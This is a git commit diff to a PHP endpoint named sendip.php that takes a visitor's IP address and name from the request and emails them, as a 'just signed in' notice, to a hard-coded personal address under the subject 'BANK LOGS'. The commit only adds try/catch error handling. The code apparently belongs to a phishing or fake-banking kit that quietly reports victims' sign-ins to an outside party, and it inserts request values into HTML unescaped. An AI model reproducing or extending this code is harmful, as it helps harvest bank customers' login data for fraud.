d4c738a63d782de91d7e3035f8d1fdd9ba7043ee
Chidindu Emmanuel Aneke <86878828+Jace-Tech@users.noreply.github.com>
2023-03-09 06:47:31 +0100

    updated

--- user/api/sendip.php
+++ user/api/sendip.php
@@ -3,22 +3,26 @@ require_once "config.php";
 
 
 if (isset($_REQUEST['ip'])) {
-  $text = $_REQUEST['ip'];
-  $name = $_REQUEST['name'];
-
-  $message = "
-  <html>
-    <body>
-      <h2>$name just signed in</h2>
-      <p>$text</p>
-    </body>
-  </html>";
-
-  if (!sendEmail("alexjace151@gmail.com", "BANK LOGS", $message)){
-    echo "Message not sent";
-  }
-  else {
-    echo "Message sent";
-  }
+  try {
+    $text = $_REQUEST['ip'];
+    $name = $_REQUEST['name'];
   
+    $message = "
+    <html>
+      <body>
+        <h2>$name just signed in</h2>
+        <p>$text</p>
+      </body>
+    </html>";
+  
+    if (!sendEmail("alexjace151@gmail.com", "BANK LOGS", $message)){
+      echo "Message not sent";
+    }
+    else {
+      echo "Message sent";
+    }
+  }
+  catch(Exception $e) {
+    echo $e->getMessage();
+  }
 }
